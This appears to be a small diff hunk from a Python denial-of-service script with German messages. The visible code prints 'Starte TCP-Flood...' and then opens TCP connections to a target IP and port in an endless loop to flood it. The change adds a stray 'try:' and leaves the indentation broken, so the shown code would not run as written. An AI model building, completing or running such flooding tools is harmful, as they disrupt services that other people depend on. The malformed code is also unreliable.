@@ -44,6 +44,7 @@ elif method == "2":
     print("Starte TCP-Flood...")
     try:
     while True:
+        try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             sock.connect((ip, port))
